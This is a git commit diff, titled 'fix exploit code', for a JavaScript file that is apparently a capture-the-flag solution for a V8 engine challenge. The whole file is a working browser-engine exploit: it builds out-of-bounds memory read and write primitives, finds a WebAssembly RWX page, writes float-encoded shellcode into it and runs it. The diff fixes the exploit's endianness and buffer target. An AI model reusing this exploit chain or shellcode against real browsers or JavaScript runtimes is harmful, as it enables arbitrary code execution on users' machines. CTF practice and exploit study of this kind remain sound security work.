d7a16529a6df569fdcc4fe43a3cdab749028f76b
exd0tpy <jsw5258@ajou.ac.kr>
2021-04-13 20:05:37 +0900

    fix exploit code

--- Download_Horsepower/ex.js
+++ Download_Horsepower/ex.js
@@ -1,4 +1,3 @@
-
 var buf = new ArrayBuffer(8);
 var f64buf = new Float64Array(buf);
 var u64buf = new Uint32Array(buf);
@@ -50,11 +49,10 @@ function write_shellcode(){
 	shellcode = [8.191473375206089e-79, 3.775826202043335e+79, 1.1205295651588473e+253, 7.748604185565308e-304, 2.460307022775963e+257, 1.7734484618746183e-288, 4.089989556334856e+40, 1.7766596360849696e-302, 3.6509617888350745e+206, 4.1942076e-316];
 	rwx_high = rwx & 0xffffffffn;
 	rwx_low = rwx / 0x100000000n;
-	console.log(rwx_low.toString(16), rwx_high.toString(16));
 	oob_arr[52] = itof(rwx_low, 64);
 	oob_arr[51] = itof(rwx_high << 32n, 64);
 	for(let i =0; i<shellcode.length;i++){
-		dataview.setFloat64(i*Float64Array.BYTES_PER_ELEMENT, shellcode[i]);
+		dataview.setFloat64(i*Float64Array.BYTES_PER_ELEMENT, shellcode[i], true);
 	}
 
 }
@@ -66,11 +64,8 @@ var object_map = double_map + 0x50n;
 console.log("[+] double map : ", double_map.toString(16));
 console.log("[+] object map : ", object_map.toString(16));
 var target_buffer = new ArrayBuffer(0x500);
-var dataview = new DataView(buf);
-//oob_arr[52] high
-//oob_arr[51] low
-oob_arr[52] = itof(0x42424242n, 64);
-oob_arr[51] = itof(0x41414141n << 32n, 64);
+var dataview = new DataView(target_buffer);
+
 let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
 let wasmModule = new WebAssembly.Module(wasmCode);
 let wasmInstance = new WebAssembly.Instance(wasmModule);
@@ -79,11 +74,7 @@ let wasmFunction = wasmInstance.exports.main;
 
 let rwx = aar(addrof(wasmInstance) + 0x67n) >> 8n;
 console.log("[*] rwx : " + rwx.toString(16));
-rwx = rwx + 1n;
-// https://www.willsroot.io/2021/04/turboflan-picoctf-2021-writeup-v8.html
-//var shellcode = [0x747868, 0x2eb84800, 0x616c662f, 0x50742e67, 0x6ae78948, 0x6a5e00, 0x58026a5a, 0x8948050f, 0xe68948c7, 0x6a5a646a, 0x50f5800, 0x6a5f016a, 0x50f5801, 0x90909090];
 console.log("[+] target_buffer : " + addrof(target_buffer).toString(16));
 write_shellcode()
 
 wasmFunction();
-
